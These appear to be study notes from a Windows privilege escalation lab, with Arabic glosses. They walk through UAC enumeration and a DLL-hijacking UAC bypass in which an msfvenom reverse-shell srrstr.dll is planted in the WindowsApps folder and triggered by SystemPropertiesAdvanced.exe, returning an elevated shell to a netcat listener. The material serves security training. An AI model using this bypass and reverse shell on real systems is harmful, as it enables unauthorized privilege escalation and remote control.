# User Account Control

**User Account Control(UAC):** feature in windows which display consent prompt when program run service need high privilege

عباره عن برومبت بتظهر لما بترن حاجه محتاجه صلاحيات عاليه

When UAC is enable all Apps running with user privilege wither admin accept to running with admin privilege

لما الحاجه دي تبقي شغاله البرامج والمهام بتشتغل بصلاحيات مستخدم عادي، إلا لو الأدمن وافق صراحة إنها تشتغل بصلاحيات أدمن. ده بيحمي الأدمن من إنه يعمل تغييرات خطيرة من غير قصد.

**UAC is not Security Boundary**

***

## **Checking Current User**

```powershell
C:\htb> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

## **Confirming Admin Group Membership**

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

## **Reviewing User Privileges**

```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## **Confirming UAC is Enabled**

check if UAC is enabled if value is 0x1 then UAC is enabled

```powershell
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

## **Checking UAC Level**

The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

```powershell
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

## **Checking Windows Version**

UAC bypasses leverage flaws or unintended functionality in different Windows builds

```powershell
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release `1607`.

![image.png](<../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png>)

> **The** [**UACME**](https://github.com/hfiref0x/UACME) **project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it**

<figure><img src="../../../../.gitbook/assets/image 1 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Reviewing Path Variable**

The `WindowsApps` folder is within the user's profile and writable by the user.

```powershell
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

***

## **Generating Malicious srrstr.dll DLL**

First, let's generate a DLL to execute a reverse shell. and open listener

```bash
irix@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

## **Testing Connection**

run dll with privilege user to confirm it’s work

```bash
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

## **Executing SystemPropertiesAdvanced.exe on Target Host**

Before proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.

```bash
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.

```bash
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## **Receiving Connection Back**

Checking back on our listener, we should receive a connection almost instantly.

```bash
irix@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah

C:\Windows\system32>whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

***
